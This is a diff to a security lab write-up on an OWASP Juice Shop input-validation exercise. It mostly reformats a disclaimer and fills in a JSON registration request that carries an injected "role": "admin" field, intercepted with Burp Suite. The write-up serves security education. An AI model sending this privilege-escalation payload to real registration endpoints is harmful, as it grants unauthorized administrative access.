@@ -14,8 +14,8 @@ sidebar_position: 3
 - [Reproduction Steps](#reproduction-steps)
 - [Remediation](#remediation)
 
-:::danger[WARNING]
-The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.
+:::danger[WARNING]  
+The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.  
 :::
 
 ## Vulnerability Overview: Improper Input Validation
@@ -79,8 +79,14 @@ Attempt a new registration, intercept the Request with the Burp Suite Intercepto
   "password": "aaaaa",
   "passwordRepeat": "aaaaa",
   "role": "admin",
-  "securityQuestion": // and so on
-
+  "securityQuestion": {
+    "id":1,
+    "question":"Your eldest siblings middle name?",
+    "createdAt":"2026-03-13T09:09:47.443Z",
+    "updatedAt":"2026-03-13T09:09:47.443Z"
+    },
+    "securityAnswer":"a"
+}
 ```
 
 ### 3. Exploitation
